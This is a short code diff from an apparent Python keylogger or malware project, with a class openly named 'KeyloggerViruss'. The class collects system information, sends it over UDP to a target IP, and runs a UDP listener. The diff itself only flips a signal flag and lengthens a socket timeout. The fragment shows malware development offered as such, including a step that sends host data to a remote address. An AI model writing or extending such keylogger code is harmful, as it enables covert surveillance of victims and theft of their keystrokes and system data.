@@ -80,7 +80,7 @@ class KeyloggerViruss():
     def start_session(self):
         # self.start_monitor()
         message = get_system_info(target_ip=IP)
-        self.send_udp_message(message="lol", signal=True)
+        self.send_udp_message(message="lol", signal=False)
 
 
     def run_keylogger(self, buffer_size: int = 4096):
@@ -88,7 +88,7 @@ class KeyloggerViruss():
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', self.port_listen))
-        sock.settimeout(0.5)
+        sock.settimeout(1)
         print(f"UDP server listening on {self.host}:{9998} (press Ctrl+C to stop)")
 
         try:
